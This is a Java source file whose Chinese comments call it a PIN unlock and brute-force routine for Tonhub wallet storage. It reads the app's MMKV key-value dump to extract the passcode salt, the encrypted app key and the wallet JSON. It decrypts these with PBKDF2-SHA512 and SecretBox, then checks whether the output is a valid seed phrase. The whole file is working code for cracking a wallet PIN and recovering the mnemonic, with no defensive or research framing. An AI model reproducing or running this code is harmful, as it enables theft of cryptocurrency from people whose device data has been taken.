package com.admin.crypto;

import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.nio.charset.StandardCharsets;
import java.util.Arrays;
import java.util.Base64;
import java.util.HashMap;
import java.util.LinkedHashMap;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import org.bouncycastle.crypto.digests.SHA512Digest;
import org.bouncycastle.crypto.generators.PKCS5S2ParametersGenerator;
import org.bouncycastle.crypto.params.KeyParameter;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONArray;
import com.alibaba.fastjson.JSONObject;

/**
 * Tonhub MMKV PIN 解锁 / 爆破。盐和 enc key 按 18 的 MMKV 键值读取，不靠正则猜长度。
 */
public final class TonhubCrypto {

    private static final Pattern WALLET_JSON = Pattern.compile(
            "\\{\"version\":2,\"selected\":\\d+,\"addresses\":\\[.*?\\]\\}");

    private TonhubCrypto() {
    }

    public static Map<String, Object> parseMmkv(byte[] raw) {
        if (raw == null || raw.length == 0) {
            throw new IllegalArgumentException("tonhub mmkv empty");
        }
        Map<String, byte[]> kv = readMmkv(raw);
        String salt = mmkvStr(kv.get("ton-storage-passcode-nacl"));
        if (salt.isEmpty()) {
            throw new IllegalArgumentException("tonhub salt not found");
        }
        String ref = mmkvStr(kv.get("ton-storage-ref"));
        String encB64 = mmkvStr(ref.isEmpty() ? null : kv.get("ton-storage-passcode-enc-key-" + ref));
        if (encB64.isEmpty()) {
            throw new IllegalArgumentException("tonhub enc key not found");
        }
        byte[] encAppKey = b64decode(encB64);
        Matcher wm = WALLET_JSON.matcher(new String(raw, StandardCharsets.ISO_8859_1));
        if (!wm.find()) {
            throw new IllegalArgumentException("tonhub wallet json not found");
        }
        JSONObject wallet = JSON.parseObject(wm.group());
        Map<String, Object> out = new LinkedHashMap<>();
        out.put("salt", salt);
        out.put("enc_app_key", encAppKey);
        out.put("wallet", wallet);
        return out;
    }

    /** 首字节等于剩余长度时，去掉这个长度前缀。 */
    private static String mmkvStr(byte[] value) {
        if (value == null || value.length == 0) {
            return "";
        }
        if ((value[0] & 0xFF) == value.length - 1) {
            return new String(value, 1, value.length - 1, StandardCharsets.UTF_8);
        }
        return new String(value, StandardCharsets.UTF_8);
    }

    /**
     * 前 4 字节是内容长度，再跳过 4 字节，后面按变长整数读 key、value。
     */
    private static Map<String, byte[]> readMmkv(byte[] data) {
        Map<String, byte[]> out = new HashMap<>();
        if (data == null || data.length < 12) {
            return out;
        }
        int actualSize = ByteBuffer.wrap(data, 0, 4).order(ByteOrder.LITTLE_ENDIAN).getInt();
        int pos = 8;
        int limit = Math.min(8 + Math.max(actualSize, 0), data.length);
        while (pos < limit) {
            int[] keyLen = readVarint(data, pos);
            if (keyLen == null) {
                break;
            }
            pos = keyLen[1];
            int klen = keyLen[0];
            if (klen <= 0 || klen > 2048 || pos + klen > data.length) {
                break;
            }
            String key = new String(data, pos, klen, StandardCharsets.UTF_8);
            pos += klen;
            int[] valLen = readVarint(data, pos);
            if (valLen == null) {
                break;
            }
            pos = valLen[1];
            int vlen = valLen[0];
            if (vlen < 0 || pos + vlen > data.length) {
                break;
            }
            out.put(key, Arrays.copyOfRange(data, pos, pos + vlen));
            pos += vlen;
        }
        return out;
    }

    private static int[] readVarint(byte[] data, int pos) {
        int n = 0;
        int shift = 0;
        while (pos < data.length) {
            int b = data[pos] & 0xFF;
            pos++;
            n |= (b & 0x7F) << shift;
            if ((b & 0x80) == 0) {
                return new int[] {n, pos};
            }
            shift += 7;
            if (shift > 35) {
                return null;
            }
        }
        return null;
    }

    public static String decryptPin(String passcode, String salt, byte[] encAppKey, byte[] secretKeyEnc) {
        if (passcode == null || salt == null || encAppKey == null || secretKeyEnc == null) {
            return null;
        }
        if (encAppKey.length < 24 || secretKeyEnc.length < 24) {
            return null;
        }
        byte[] key = pbkdf2Sha512(passcode.getBytes(StandardCharsets.UTF_8), salt.getBytes(StandardCharsets.UTF_8), 100000, 32);
        byte[] nonce1 = new byte[24];
        System.arraycopy(encAppKey, 0, nonce1, 0, 24);
        byte[] ct1 = new byte[encAppKey.length - 24];
        System.arraycopy(encAppKey, 24, ct1, 0, ct1.length);
        byte[] appKey = SecretBox.open(ct1, nonce1, key);
        if (appKey == null) {
            return null;
        }
        byte[] nonce2 = new byte[24];
        System.arraycopy(secretKeyEnc, 0, nonce2, 0, 24);
        byte[] ct2 = new byte[secretKeyEnc.length - 24];
        System.arraycopy(secretKeyEnc, 24, ct2, 0, ct2.length);
        byte[] plain = SecretBox.open(ct2, nonce2, appKey);
        if (plain == null) {
            return null;
        }
        return new String(plain, StandardCharsets.UTF_8);
    }

    public static boolean phraseOk(String phrase) {
        if (phrase == null) {
            return false;
        }
        String[] parts = phrase.trim().split("\\s+");
        if (parts.length != 12 && parts.length != 15 && parts.length != 18 && parts.length != 21 && parts.length != 24) {
            return false;
        }
        for (String w : parts) {
            if (w.isEmpty()) {
                return false;
            }
            for (int i = 0; i < w.length(); i++) {
                char c = w.charAt(i);
                if (c < 'a' || c > 'z') {
                    return false;
                }
            }
        }
        return true;
    }

    public static byte[] secretKeyEncFromWallet(JSONObject wallet) {
        if (wallet == null) {
            return null;
        }
        JSONArray addrs = wallet.getJSONArray("addresses");
        if (addrs == null || addrs.isEmpty()) {
            return null;
        }
        JSONObject a0 = addrs.getJSONObject(0);
        return b64decode(a0.getString("secretKeyEnc"));
    }

    public static byte[] b64decode(String s) {
        String raw = s == null ? "" : s.trim();
        int pad = (4 - (raw.length() % 4)) % 4;
        raw = raw + "====".substring(0, pad);
        return Base64.getDecoder().decode(raw);
    }

    private static byte[] pbkdf2Sha512(byte[] password, byte[] salt, int iter, int dkLen) {
        PKCS5S2ParametersGenerator gen = new PKCS5S2ParametersGenerator(new SHA512Digest());
        gen.init(password, salt, iter);
        return ((KeyParameter) gen.generateDerivedParameters(dkLen * 8)).getKey();
    }
}
